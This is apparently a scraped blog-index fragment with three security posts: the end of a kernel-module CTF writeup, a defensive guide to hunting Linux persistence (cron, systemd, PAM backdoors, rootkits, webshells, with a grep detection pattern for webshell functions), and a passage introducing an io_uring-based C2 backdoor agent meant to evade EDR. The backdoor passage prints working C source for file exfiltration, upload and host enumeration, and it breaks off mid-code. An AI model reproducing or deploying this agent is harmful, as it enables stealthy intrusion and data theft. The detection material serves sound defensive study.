you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), 